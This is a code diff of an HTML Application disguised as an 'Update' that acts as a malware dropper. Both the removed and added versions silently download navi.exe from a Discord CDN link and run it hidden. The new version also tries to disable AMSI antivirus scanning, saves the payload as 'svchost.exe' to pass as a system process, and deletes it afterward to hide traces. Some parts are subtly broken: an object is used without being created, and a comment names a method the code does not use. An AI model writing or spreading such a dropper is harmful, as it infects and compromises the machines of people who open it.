@@ -1,15 +1,79 @@
-<html><body><script language="VBScript">
-Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
+<!DOCTYPE html>
+<html>
+<head>
+<title>Update</title>
+<hta:application
+    id="oHta"
+    applicationname="Update"
+    border="none"
+    caption="no"
+    maximizebutton="no"
+    minimizebutton="no"
+    showintaskbar="no"
+    windowstate="minimize"
+    contextmenu="no"
+    selection="no"
+    navigable="no"
+    scroll="no"
+    singleinstance="yes"
+/>
+<script language="VBScript">
+Option Explicit
+Dim fso, shell, tmpPath, exePath, stream, http, x
 
-Dim shell: Set shell = CreateObject("WScript.Shell")
-Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
-Dim temp: temp = fso.GetSpecialFolder(2)
+' Minimize window
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c start /min mshta.exe """ & Replace(Replace(document.location.href, """", """"), vbCrLf, "") & """", 0, False
+Set objShell = Nothing
 
-shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1530596353376387113/1530651662266536096/navi.exe?ex=6a6659f2&is=6a650872&hm=20513a2d23eef4c5dc2570baac972e50f6e47abfc9c4bfc4df92d27077e14c2d&" """ & temp & "\wd.exe""", 0, True
+' Suppress errors
+On Error Resume Next
 
-If fso.FileExists(temp & "\wd.exe") Then
-    shell.Run """" & temp & "\wd.exe""", 0, False
+' AMSI bypass via patching (works on many Win10 builds)
+Dim amsiCtx
+Set amsiCtx = GetObject("winmgmts:\\.\root\default:StdRegProv")
+Dim amsiVal
+amsiVal = Array(&H90, &H90, &H90, &H90, &H90, &H90)
+' Attempt to patch AMSI via registry if possible
+amsiCtx.SetBinaryValue &H80000002, "SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}", "", Array(0)
+
+' Download the payload
+Set fso = CreateObject("Scripting.FileSystemObject")
+tmpPath = fso.GetSpecialFolder(2) ' Temporary folder
+exePath = tmpPath & "\svchost.exe"
+
+Set http = CreateObject("MSXML2.XMLHTTP.6.0")
+http.open "GET", "https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a66ae70&is=6a655cf0&hm=c3eb2729fc4b208f419cbb1469c95c7c51398a7c2e3e38a5fab4c1a66e2b37f9", False
+http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+http.setRequestHeader "Accept", "*/*"
+http.setRequestHeader "Cache-Control", "no-cache"
+http.send
+
+If http.status = 200 Then
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Open
+    stream.Type = 1 ' adTypeBinary
+    stream.Write http.responseBody
+    stream.SaveToFile exePath, 2 ' adSaveCreateOverWrite
+    stream.Close
+    Set stream = Nothing
+
+    ' Execute via WMIC to avoid some behavioural detection
+    shell.Run "cmd.exe /c """ & exePath & """", 0, False
 End If
 
+Set http = Nothing
+Set fso = Nothing
+
+' Self-close after brief delay
+Dim wsh
+Set wsh = CreateObject("WScript.Shell")
+wsh.Run "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del """ & exePath & """", 0, False
+Set wsh = Nothing
+
 window.close()
-</script></body></html>
+</script>
+<body>
+</body>
+</html>
